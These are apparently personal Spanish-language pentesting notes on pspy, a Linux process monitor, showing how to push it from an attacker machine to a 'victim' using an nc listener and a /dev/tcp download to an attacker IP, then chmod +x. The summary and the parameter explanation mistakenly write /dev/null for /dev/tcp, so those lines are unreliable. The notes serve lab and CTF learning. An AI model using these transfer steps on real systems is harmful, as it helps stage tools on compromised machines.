[Link de la herramienta pspy](https://github.com/DominicBreuker/pspy/releases/tag/v1.2.1)

# Resumen de comandos en orden

```shell
Desde nuestra maquina: nc -nlvp Puerto < NombreDelArchivo
Desde la maquina victima: cat < /dev/null/IpDeNuestraMaquina/Puerto > NombreDelArchivo
```
--------

Es una herramienta que permite **ver procesos en ejecución en tiempo real** en sistemas Linux **sin necesidad de privilegios root**.
![[pspy.png]]
Para pasarnos el pspy desde nuestra maquina a la maquina victima
```shell
Desde nuestra maquina: nc -nlvp Puerto < NombreDelArchivo
Ejemplo desde nuestra maquina: nc -nlvp 443 < pspy

Desde la maquina victima: cat < /dev/tcp/IpDeNuestraMaquina/Puerto > NombreDelArchivo
Ejemplo desde la maquina victima: cat < /dev/tcp/10.10.11.130/443 > pspy
```
Para mas informacion sobre el comando [[nc -nlvp 443]]

*Parametros comando maquina victima*
`cat` Es para ver el contenido de un archivo
`< /dev/null/IpDeNuestraMaquina/Puerto` Establece una conexion a nuestra maquina


##### Recordatorio
Una vez recibido el archivo a la maquina victima, recordar darle permisos de ejecucion
```shell
chmod +x NombreDelArchivo
Ejemplo: chmod +x pspy
```